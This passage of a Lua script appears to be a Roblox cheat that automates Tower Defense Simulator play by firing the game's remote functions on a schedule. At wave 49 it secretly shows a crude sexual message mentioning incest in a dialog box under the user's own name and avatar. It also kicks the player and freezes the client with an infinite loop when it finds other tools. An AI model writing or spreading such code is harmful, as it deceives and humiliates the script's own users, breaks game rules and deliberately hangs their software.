                    until T.State.Wave.Value == b and T.State.Timer.Time.Value == Q(d, c) or
                        T.State.Wave.Value == b and (T.State.Timer.Time.Value + 1) == Q(d, c)
                    getgenv().output(
                        "Sold (Troop " .. K(game.Workspace.Towers[tostring(e)]) .. " With Number " .. tostring(e) .. ")"
                    )
                    l(e)
                end
            end
        )
    end
    function O:Skip(b, a, c)
        spawn(
            function()
                appendfile("TDS_AutoStrat/LastStrat.txt", "TDS:Skip(" .. b .. ", " .. a .. ", " .. c .. ")\n")
                if R() then
                    repeat
                        wait()
                    until T.State.Wave.Value == b and T.State.Timer.Time.Value == Q(c, a) or
                        T.State.Wave.Value == b and (T.State.Timer.Time.Value + 1) == Q(c, a)
                    m()
                end
            end
        )
    end
    function O:Ability(a, b, d, e, c)
        spawn(
            function()
                appendfile(
                    "TDS_AutoStrat/LastStrat.txt",
                    "TDS:Ability(" .. a .. ', "' .. b .. '", ' .. d .. ", " .. e .. ", " .. c .. ")\n"
                )
                if R() then
                    repeat
                        wait()
                    until T.State.Wave.Value == d and T.State.Timer.Time.Value == Q(c, e) or
                        T.State.Wave.Value == d and (T.State.Timer.Time.Value + 1) == Q(c, e)
                    n(a, b)
                end
            end
        )
    end
    function O:AutoChain(d, f, e, c, b, a)
        spawn(
            function()
                appendfile(
                    "TDS_AutoStrat/LastStrat.txt",
                    "TDS:AutoChain(" .. d .. ", " .. f .. ", " .. e .. ", " .. c .. ", " .. b .. ", " .. a .. ")\n"
                )
                if R() then
                    repeat
                        wait()
                    until T.State.Wave.Value == c and T.State.Timer.Time.Value == Q(a, b) or
                        T.State.Wave.Value == c and (T.State.Timer.Time.Value + 1) == Q(a, b)
                    repeat
                        wait()
                    until game:GetService("Workspace").Towers:FindFirstChild(tostring(d))
                    repeat
                        wait()
                    until game:GetService("Workspace").Towers:FindFirstChild(tostring(f))
                    repeat
                        wait()
                    until game:GetService("Workspace").Towers:FindFirstChild(tostring(e))
                    if K(game.Workspace.Towers[tostring(d)]) ~= "Commander" then
                        getgenv().output("Error, troop with id " .. d .. " is not Commander!")
                    end
                    if K(game.Workspace.Towers[tostring(f)]) ~= "Commander" then
                        getgenv().output("Error, troop with id " .. f .. " is not Commander!")
                    end
                    if K(game.Workspace.Towers[tostring(e)]) ~= "Commander" then
                        getgenv().output("Error, troop with id " .. e .. " is not Commander!")
                    end
                    function x(a)
                        if game:GetService("Workspace").Towers:FindFirstChild(tostring(a)) then
                            local b = game:GetService("Workspace").Towers:FindFirstChild(tostring(a))
                            if
                                not b.Replicator.Stuns:GetAttribute("1") and not b.Replicator.Stuns:GetAttribute("2") and
                                    not b.Replicator.Stuns:GetAttribute("3")
                             then
                                game:GetService("ReplicatedStorage").RemoteFunction:InvokeServer(
                                    "Troops",
                                    "Abilities",
                                    "Activate",
                                    {
                                        ["Troop"] = game:GetService("Workspace").Towers:FindFirstChild(tostring(a)),
                                        ["Name"] = "Call Of Arms"
                                    }
                                )
                            else
                                getgenv().output("Detected stun on commander " .. tostring(a) .. ", waiting...")
                                repeat
                                    wait()
                                until not b.Replicator.Stuns:GetAttribute("1") and
                                    not b.Replicator.Stuns:GetAttribute("2") and
                                    not b.Replicator.Stuns:GetAttribute("3")
                                game:GetService("ReplicatedStorage").RemoteFunction:InvokeServer(
                                    "Troops",
                                    "Abilities",
                                    "Activate",
                                    {
                                        ["Troop"] = game:GetService("Workspace").Towers:FindFirstChild(tostring(a)),
                                        ["Name"] = "Call Of Arms"
                                    }
                                )
                            end
                        else
                            getgenv().output("Commander " .. tostring(a) .. " removed, aborting AutoChain...")
                            getgenv().breaks = true
                        end
                    end
                    getgenv().output(
                        "Activated AutoChain (Troops " ..
                            tostring(d) .. ", " .. tostring(f) .. ", " .. tostring(e) .. ")"
                    )
                    while wait() do
                        if getgenv().breaks then
                            break
                        end
                        x(d)
                        wait(10.01)
                        x(f)
                        wait(10.01)
                        x(e)
                        wait(10.01)
                    end
                    getgenv().breaks = false
                end
            end
        )
    end
    function O:Target(d, a, c, b)
        spawn(
            function()
                appendfile(
                    "TDS_AutoStrat/LastStrat.txt",
                    "TDS:Target(" .. d .. ", " .. a .. ", " .. c .. ", " .. b .. ")\n"
                )
                if R() then
                    repeat
                        wait()
                    until T.State.Wave.Value == a and T.State.Timer.Time.Value == Q(b, c) or
                        T.State.Wave.Value == a and (T.State.Timer.Time.Value + 1) == Q(b, c)
                    repeat
                        wait()
                    until game.Workspace.Towers:FindFirstChild(tostring(d))
                    S:InvokeServer(
                        "Troops",
                        "Target",
                        "Set",
                        {["Troop"] = game.Workspace.Towers:WaitForChild(tostring(d))}
                    )
                    getgenv().output(
                        "Changed Target (Troop " ..
                            K(game.Workspace.Towers[tostring(d)]) .. " With Number " .. tostring(d) .. ")"
                    )
                end
            end
        )
    end
    if R() then
        w = false
        while wait() do
            for a, a in pairs(game.CoreGui:GetDescendants()) do
                if a:IsA("TextLabel") and a.Text == "Camera" then
                    a.Parent.Position = UDim2.new(0, 220, 0, 0)
                    w = true
                    break
                end
            end
            if w then
                break
            end
        end
    end
    spawn(
        function()
            if R() then
                repeat
                    wait()
                until T.State.Wave.Value == 49 and T.State.Timer.Time.Value == 7 or
                    T.State.Wave.Value == wave and (T.State.Timer.Time.Value + 1) == 7
                require(game:GetService("ReplicatedStorage").Client.Modules.Game.Interface.Elements.Dialog).Appear(
                    {
                        ["ui"] = game:GetService("Players").LocalPlayer.PlayerGui.GameGui.Dialog,
                        ["Primary"] = {["Backdrop"] = game:GetService("Players").LocalPlayer.PlayerGui.GameGui.Backdrop}
                    },
                    true
                )
                require(game:GetService("ReplicatedStorage").Client.Modules.Game.Interface.Elements.Dialog).Write(
                    {["ui"] = game:GetService("Players").LocalPlayer.PlayerGui.GameGui.Dialog},
                    {
                        ["Icon"] = "rbxthumb://type=AvatarHeadShot&id=" ..
                            game.Players.LocalPlayer.UserId .. "&w=150&h=150",
                        ["Author"] = game.Players.LocalPlayer.Name,
                        ["Text"] = "I need to suck my cock Commander. I masturbate 1 time for 1 second and then I go to bed with my sister. Commander PLEASE HELP ME!!! If you got this msg dm Money Maker"
                    }
                )
                wait(1)
                require(game:GetService("ReplicatedStorage").Client.Modules.Game.Interface.Elements.Dialog).Appear(
                    {
                        ["ui"] = game:GetService("Players").LocalPlayer.PlayerGui.GameGui.Dialog,
                        ["Primary"] = {["Backdrop"] = game:GetService("Players").LocalPlayer.PlayerGui.GameGui.Backdrop}
                    },
                    false
                )
            end
        end
    )
    spawn(
        function()
            while wait(1) do
                for a, a in pairs(game.CoreGui:GetDescendants()) do
                    if
                        a:IsA("TextButton") and string.find(string.lower(a.Text), "afk") or
                            a:IsA("TextLabel") and string.find(string.lower(a.Text), "afk") and
                                not a.Parent.Parent.Parent.Name == "ChatChannelParentFrame"
                     then
                        game.Players.LocalPlayer:Kick(
                            "\n\n---------- AUTO STRAT ----------\n\nError 3:\nFound External Script that can be cause to bugs while Auto Farming : \n\nAnti Afk \n(Anti Afk is built in script!)\n\n---------- AUTO STRAT ----------\n"
                        )
                        wait(0.5)
                        while true do
                        end
                    end
                end
                for a, a in pairs(game.Players.LocalPlayer.PlayerGui:GetDescendants()) do
                    if
                        a:IsA("TextButton") and string.find(string.lower(a.Text), "afk") or
                            a:IsA("TextLabel") and string.find(string.lower(a.Text), "afk") and
                                not a.Parent.Parent.Parent.Name == "ChatChannelParentFrame"
                     then
                        game.Players.LocalPlayer:Kick(
                            "\n\n---------- AUTO STRAT ----------\n\nError 3:\nFound External Script that can be cause to bugs while Auto Farming : \n\nAnti Afk \n(Anti Afk is built in script!)\n\n---------- AUTO STRAT ----------\n"
                        )
                        wait(0.5)
                        while true do
                        end
                    end
                end
            end
        end
    )
    spawn(
        function()
            if not getgenv().PotatoPC then
                wait(5)
            else
                wait(10)
            end
            if not getgenv().MapUsed and not getgenv().IsMultiStrat then
                game.Players.LocalPlayer:Kick(
                    "\n\n---------- AUTO STRAT ----------\n\nError 1:\nIt looks like you are using raw script, you need to apply Strat or Record it, download strats from #strats and get recorder from #recorder-changelog on my discord server\n\n---------- AUTO STRAT ----------\n"
                )
                wait(0.5)
                while true do
                end
            end
        end
    )
end
return O
